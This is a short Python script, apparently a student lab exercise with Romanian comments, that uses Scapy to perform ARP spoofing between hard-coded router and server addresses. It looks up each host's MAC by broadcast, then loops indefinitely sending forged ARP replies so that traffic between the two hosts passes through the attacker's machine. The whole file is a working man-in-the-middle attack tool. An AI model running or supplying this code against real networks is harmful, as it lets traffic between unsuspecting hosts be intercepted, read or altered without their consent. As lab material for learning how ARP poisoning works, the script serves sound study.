import time
import threading
from scapy.all import *
from scapy.layers.l2 import ARP, Ether, srp, conf

ipServer = "198.7.0.2"
ipRouter = "198.7.0.1"
ipMiddle = "198.7.0.3"
#https://medium.com/@ravisinghmnnit12/how-to-do-man-in-the-middle-attack-mitm-with-arp-spoofing-using-python-and-scapy-441ee577ba1b
def get_mac(target_ip):
    conf.iface = 'eth0'
    # req care contine ip ul targetului
    req = ARP(pdst = target_ip, op = 1)
    # pachetul de transmis
    pac = Ether(dst = "ff:ff:ff:ff:ff:ff")
    # combinam pachetele
    req_broadcast = pac/req
    # luam raspunsul
    ans = srp(req_broadcast, timeout=2, verbose=0)
    print(ans)
    # luam primul raspuns ca avem un sigun request
    ans = ans[0]
    # luam adresa MAC
    mac = ans[0][1].hwsrc
    return mac

def spoof(init, final):
    # luam adresa mac a primului ip
    nouMac = get_mac(init)
    # creeam un pachet ARP de tip reply unde avem hardware destination adresa mac a primului ip
    noup = ARP(op = 2, hwdst = nouMac, pdst = init, psrc = final)
    # trimitem pachetul
    send(noup, verbose=1)

while True:
    # pornim thread uri pentru a trimite pachetele
    t1 = threading.Thread(target=spoof, args=(ipRouter, ipServer))
    t2 = threading.Thread(target=spoof, args=(ipServer, ipRouter))
    t1.start()
    t2.start()
    time.sleep(2)